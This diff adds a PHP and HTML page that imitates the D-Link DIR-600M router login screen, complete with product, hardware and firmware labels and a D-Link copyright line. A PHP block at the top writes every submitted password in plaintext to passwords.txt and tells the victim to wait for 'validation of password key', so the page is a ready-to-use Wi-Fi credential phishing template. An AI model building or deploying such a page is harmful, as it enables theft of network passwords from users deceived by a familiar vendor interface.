@@ -1,0 +1,159 @@
+<?php
+
+	if(isset($_POST['button'])){
+		if(isset($_POST['password']) && !empty($_POST['password'])){
+			$password = $_POST['password'];
+			echo 'Please wait for validation of password key: '.$password.'<br>';
+			$fp =fopen('passwords.txt', 'a');
+			fwrite($fp, $password);
+			fwrite($fp, "\n");
+			fclose($fp);
+		}else {
+			echo "Wifi password cannot be empty<br>";
+		}
+	}
+?>
+<!DOCTYPE html>
+<html>
+<head>
+
+<title>
+
+ Wireless Router
+</title>
+
+
+
+<body>
+
+<div class="login">
+
+<table border="0" cellpadding="0" cellspacing="0" width="842">
+
+ <tbody><tr>
+
+  <td align="left" height="30" bgcolor="#404343" colspan="1">&nbsp;&nbsp;&nbsp;&nbsp;Product Page:
+
+<!--<script>
+
+  document.write(ModemVer);
+</script>-->DIR-600M
+
+  </td>
+
+  <td align="right" height="30" bgcolor="#404343" colspan="2">Hardware version:
+
+<!--<script>
+
+  document.write(HardwareVer);
+</script>-->C1
+
+&nbsp;&nbsp;&nbsp;&nbsp;Firmware Version:
+<!--<script>
+
+  document.write(FirmwareVer);
+</script>3.05-->
+
+  &nbsp;&nbsp;&nbsp;&nbsp;
+  </td>
+
+ </tr>
+
+</tbody></table>
+
+<table border="0" cellpadding="0" cellspacing="0" width="842">
+
+ <tbody><tr background="./Wireless Router_files/head_02.gif">
+
+  <td align="left"><a href="#" target="_blank"><img src="./Wireless Router_files/head_01.gif" border="0" width="162"></a></td>
+
+  <td background="./Wireless Router_files/head_02.gif" width="584"></td>
+
+  <td align="right"><img src="./Wireless Router_files/head_03.gif" width="96"></td>
+
+ </tr>
+
+</tbody></table>
+
+<!--<form action="http://192.168.0.1/login.cgi" method="post" name="test" autocomplete="off">-->
+
+ <div class="login_box">
+
+  <p class="letterBg">
+
+   Login
+  </p>
+
+  <table class="login_table">
+
+   <tbody><tr>
+
+    <td>
+
+     Username:&nbsp;
+    </td>
+
+    <td>
+
+     <input style="width: 150px;" type="text" id="username" name="username" value="Admin">
+    </td>
+
+   </tr>
+
+   <tr>
+
+    <td>
+
+     Password:&nbsp;
+    </td>
+
+    <td>
+
+     <input style="width: 150px;" name="password" id="password" type="password">
+
+    </td>
+
+   </tr>
+
+   <tr>
+
+    <td colspan="2">
+
+     <div class="login_btn">
+
+      <input name = "button" id="loginBtn" type="submit" value="Login" class="link_bg">
+
+      <!--<input type="hidden" name="submit.htm?login.htm" value="Send">-->
+
+     </div>
+
+    </td>
+
+   </tr>
+
+  </tbody></table>
+
+ </div>
+
+</form>
+
+<div class="loginBottom">
+
+</div>
+
+<div class="copywright">
+
+Copyright © 2008-2015 D-Link Systems, Inc.
+</div>
+
+</div>
+
+
+</script>
+
+
+
+
+
+</body></html>
+
